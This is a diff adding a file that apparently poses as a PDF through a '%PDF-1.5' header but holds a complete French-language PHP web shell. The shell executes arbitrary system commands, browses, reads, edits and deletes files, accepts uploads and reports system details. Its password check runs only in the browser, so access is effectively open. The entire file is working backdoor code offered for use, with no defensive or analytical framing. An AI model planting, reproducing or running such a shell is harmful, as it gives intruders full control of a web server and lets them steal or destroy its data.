@@ -1,0 +1,229 @@
+%PDF-1.5
+
+<?php
+/**
+ * WebShell PHP - Interface Web Hacker Rouge (Avancé)
+ * Authentification via localStorage (mot de passe : Azerty123@)
+ * Fonctionnalités : Terminal, Explorateur, Éditeur, Upload, Infos Système
+ */
+
+$output = '';
+$fileContent = '';
+$uploadMsg = '';
+$cwd = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+chdir($cwd);
+
+if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+    $output = shell_exec($cmd);
+}
+
+if (isset($_POST['read_file'])) {
+    $filename = $_POST['read_file'];
+    if (file_exists($filename)) {
+        $fileContent = htmlspecialchars(file_get_contents($filename));
+    }
+}
+
+if (isset($_POST['save_file']) && isset($_POST['content'])) {
+    file_put_contents($_POST['save_file'], $_POST['content']);
+}
+
+if (isset($_FILES['upload'])) {
+    $target = basename($_FILES['upload']['name']);
+    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
+        $uploadMsg = "Fichier uploadé : $target";
+    } else {
+        $uploadMsg = "Échec de l'upload.";
+    }
+}
+
+if (isset($_POST['delete_file'])) {
+    $target = $_POST['delete_file'];
+    if (is_file($target)) unlink($target);
+    elseif (is_dir($target)) rmdir($target);
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>H4ck3r WebShell</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #f00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+        }
+        .hidden { display: none; }
+        .login {
+            display: flex;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .shell-container {
+            display: flex;
+            height: 100vh;
+        }
+        .sidebar {
+            width: 180px;
+            background-color: #111;
+            padding: 20px;
+            border-right: 1px solid red;
+        }
+        .sidebar button {
+            display: block;
+            width: 100%;
+            margin-bottom: 10px;
+            background: #000;
+            border: 1px solid #f00;
+            color: #f00;
+            padding: 10px;
+            cursor: pointer;
+        }
+        .content {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        h1 { color: red; text-align: center; }
+        input, textarea, button {
+            background: #111;
+            color: #f00;
+            border: 1px solid #f00;
+            padding: 8px;
+            margin: 5px;
+        }
+        textarea { width: 100%; height: 200px; }
+        ul li form { display: inline; }
+    </style>
+</head>
+<body>
+<script>
+const PASSWORD = "Azerty123@";
+function login() {
+    const pass = document.getElementById('password').value;
+    if (pass === PASSWORD) {
+        localStorage.setItem('access', 'granted');
+        window.location.href = window.location.pathname + '?shell=1';
+    } else {
+        alert("Mot de passe incorrect.");
+    }
+}
+function logout() {
+    localStorage.removeItem('access');
+    window.location.href = window.location.pathname;
+}
+window.onload = () => {
+    if (localStorage.getItem('access') === 'granted') {
+        if (!window.location.href.includes('?shell=1')) {
+            window.location.href = window.location.pathname + '?shell=1';
+        }
+    }
+};
+</script>
+<?php if (!isset($_GET['shell']) || $_GET['shell'] !== '1'): ?>
+<div class="login">
+    <h1>Connexion</h1>
+    <input type="password" id="password" placeholder="Mot de passe">
+    <button onclick="login()">Entrer</button>
+</div>
+<?php exit; endif; ?>
+
+<div class="shell-container">
+    <div class="sidebar">
+        <button onclick="showTab('dashboard')">Dashboard</button>
+        <button onclick="showTab('console')">Console</button>
+        <button onclick="showTab('explorer')">Explorateur</button>
+        <button onclick="showTab('editor')">Editeur</button>
+        <button onclick="showTab('upload')">Uploader</button>
+        <button onclick="showTab('sysinfo')">Infos Système</button>
+        <button onclick="logout()">Déconnexion</button>
+    </div>
+    <div class="content">
+        <div id="dashboard" class="tab">
+            <h1>Bienvenue dans le WebShell Hacker Rouge</h1>
+        </div>
+
+        <div id="console" class="tab hidden">
+            <form method="POST" id="cmdForm">
+                <input name="cmd" id="cmdInput" placeholder="Commande">
+                <button>Exécuter</button>
+            </form>
+            <pre><?= htmlspecialchars($output) ?></pre>
+        </div>
+
+        <div id="explorer" class="tab hidden">
+            <h3>Fichiers dans <?= $cwd ?></h3>
+            <ul>
+            <?php foreach (scandir('.') as $f): if ($f === '.') continue; ?>
+                <li>
+                    <?php if (is_dir($f)): ?>
+                        <a href="?shell=1&dir=<?= urlencode(realpath($f)) ?>">[<?= $f ?>]</a>
+                    <?php else: ?>
+                        <?= $f ?>
+                    <?php endif; ?>
+                    <form method="POST">
+                        <input type="hidden" name="read_file" value="<?= $f ?>">
+                        <button>Voir</button>
+                    </form>
+                    <form method="POST">
+                        <input type="hidden" name="delete_file" value="<?= $f ?>">
+                        <button>Suppr</button>
+                    </form>
+                </li>
+            <?php endforeach; ?>
+            </ul>
+        </div>
+
+        <div id="editor" class="tab hidden">
+            <form method="POST">
+                <input name="save_file" placeholder="Nom du fichier">
+                <textarea name="content"><?= $fileContent ?></textarea>
+                <button>Enregistrer</button>
+            </form>
+        </div>
+
+        <div id="upload" class="tab hidden">
+            <form method="POST" enctype="multipart/form-data">
+                <input type="file" name="upload">
+                <button>Uploader</button>
+            </form>
+            <p><?= $uploadMsg ?></p>
+        </div>
+
+        <div id="sysinfo" class="tab hidden">
+            <h3>Informations Système</h3>
+            <pre><?php
+                echo "Utilisateur : ", system('whoami');
+                echo "\nOS : ", php_uname();
+                echo "\nPHP : ", phpversion();
+                echo "\nDisque :\n", shell_exec('df -h');
+            ?></pre>
+        </div>
+    </div>
+</div>
+
+<script>
+function showTab(tabId) {
+    document.querySelectorAll('.tab').forEach(el => el.classList.add('hidden'));
+    document.getElementById(tabId).classList.remove('hidden');
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const cmdInput = document.getElementById('cmdInput');
+    cmdInput.addEventListener('keydown', e => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            document.getElementById('cmdForm').submit();
+        }
+    });
+    showTab('dashboard');
+});
+</script>
+</body>
+</html>
